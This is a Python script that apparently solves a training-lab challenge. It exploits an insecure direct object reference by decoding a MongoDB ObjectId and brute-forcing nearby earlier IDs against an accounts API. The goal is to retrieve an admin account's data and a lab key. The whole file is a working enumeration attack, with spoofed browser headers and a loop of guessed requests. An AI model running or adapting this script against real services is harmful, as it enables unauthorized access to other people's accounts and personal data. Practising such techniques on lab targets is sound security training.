import requests
import datetime
import binascii
import struct
import time
import json

# --- Configuration ---
# !!! IMPORTANT: Update TARGET_HOST with the new host from your request !!!
TARGET_HOST = "api-ptl-debb5a98e7aa-93e57d966e82.libcurl.me"
BASE_URL = f"https://{TARGET_HOST}/api/v1/accounts/"

# The earliest ObjectId we observed from your new response.
# This will be used to derive the base timestamp, random bytes, and counter.
YOUR_OBSERVED_OBJECT_ID = "6865f8370954c90009033a70"

# --- IDOR Guessing Ranges ---
# The challenge states "a few seconds before".
TIMESTAMP_DECREMENT_RANGE = range(1, 60) # Try from 1 second to 59 seconds before

# CRITICAL ADJUSTMENT BASED ON YOUR OBSERVATION:
# Since only the last byte of the counter changes, it's a simple increment.
# The admin's account should have a counter value just slightly lower than yours,
# or a small value if it was the very first account in a slightly earlier second.
# We'll try a small range of decrements for the full 3-byte counter.
COUNTER_DECREMENT_RANGE = range(1, 100) # Try from 1 decrement to 99 decrements.
                                        # This covers '...a6f', '...a6e' etc.
                                        # If the admin's counter started at 0 for that second,
                                        # we might need to test up to base_counter_val.
                                        # However, 'range(1,100)' is a good starting point.


# --- Function to decode ObjectId timestamp ---
def decode_oid_timestamp(oid_str):
    """Decodes the Unix timestamp from the first 4 bytes of an ObjectId string."""
    timestamp_hex = oid_str[0:8]
    timestamp = int(timestamp_hex, 16)
    return timestamp

# --- Function to construct ObjectId from parts ---
def construct_oid(timestamp_unix, random_bytes_hex, counter_val):
    """Constructs an ObjectId string from its components."""
    packed_timestamp = struct.pack('>I', timestamp_unix).hex()

    # Ensure counter is treated as a 3-byte value (6 hex chars)
    # The counter part is the last 3 bytes of a 4-byte big-endian int
    packed_counter_bytes = struct.pack('>I', counter_val)[1:]
    packed_counter = binascii.hexlify(packed_counter_bytes).decode('ascii')
    packed_counter = packed_counter.zfill(6) # Pad with leading zeros if needed


    return f"{packed_timestamp}{random_bytes_hex}{packed_counter}"

# --- Main Logic ---
def solve_idor_challenge():
    print(f"[*] Starting IDOR challenge solver for {BASE_URL}")
    print(f"[*] Using base ObjectId: {YOUR_OBSERVED_OBJECT_ID}")

    # 1. Deconstruct the observed ObjectId
    base_timestamp_unix = decode_oid_timestamp(YOUR_OBSERVED_OBJECT_ID)
    base_random_bytes_hex = YOUR_OBSERVED_OBJECT_ID[8:18] # 5 bytes (10 hex chars)
    base_counter_val = int(YOUR_OBSERVED_OBJECT_ID[18:24], 16) # Last 3 bytes (6 hex chars)

    print(f"[*] Derived base timestamp (Unix): {base_timestamp_unix} ({datetime.datetime.fromtimestamp(base_timestamp_unix, datetime.timezone.utc).isoformat()}Z)")
    print(f"[*] Derived base random bytes (hex): {base_random_bytes_hex}")
    print(f"[*] Derived base counter (decimal): {base_counter_val}")

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": f"https://{TARGET_HOST.replace('api-', '')}",
        "Referer": f"https://{TARGET_HOST.replace('api-', '')}/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Te": "trailers",
        "Connection": "keep-alive"
    }

    found_key = False

    for ts_decrement in TIMESTAMP_DECREMENT_RANGE:
        guessed_timestamp_unix = base_timestamp_unix - ts_decrement
        ts_datetime = datetime.datetime.fromtimestamp(guessed_timestamp_unix, datetime.timezone.utc)
        print(f"\n[+] Testing timestamp: {ts_datetime.isoformat()}Z (Unix: {guessed_timestamp_unix})")

        # Iterate through the counter decrements
        for counter_decrement in COUNTER_DECREMENT_RANGE:
            guessed_counter = base_counter_val - counter_decrement

            if guessed_counter < 0:
                continue

            guessed_oid = construct_oid(guessed_timestamp_unix, base_random_bytes_hex, guessed_counter)
            full_url = f"{BASE_URL}{guessed_oid}"

            try:
                print(f"    [>] Trying: {guessed_oid}".ljust(60), end='\r')
                response = requests.get(full_url, headers=headers, timeout=10)

                if response.status_code == 200:
                    data = response.json()
                    if 'PTLAB_KEY' in data and data['PTLAB_KEY'] is not None:
                        print(f"\n[!!!] SUCCESS! Found PTLAB_KEY!")
                        print(f"    Guessed ObjectId: {guessed_oid}")
                        print(f"    Admin Account Data:\n{json.dumps(data, indent=4)}")
                        found_key = True
                        return
                # else:
                #     # For debugging: print non-200 responses
                #     # print(f"\n    [x] Failed: {guessed_oid} (Status: {response.status_code})")
                #     pass

            except requests.exceptions.Timeout:
                # print(f"\n    [!] Request timed out for {full_url}")
                pass
            except requests.exceptions.RequestException as e:
                # print(f"\n    [!] Error requesting {full_url}: {e}")
                pass

    if not found_key:
        print("\n[*] Exhausted all guesses in the defined ranges. Key not found.")
        print("[*] Consider adjusting TIMESTAMP_DECREMENT_RANGE and COUNTER_DECREMENT_RANGE.")
        print("[*] Also, ensure the TARGET_HOST is correct for your current challenge instance.")


if __name__ == "__main__":
    solve_idor_challenge()
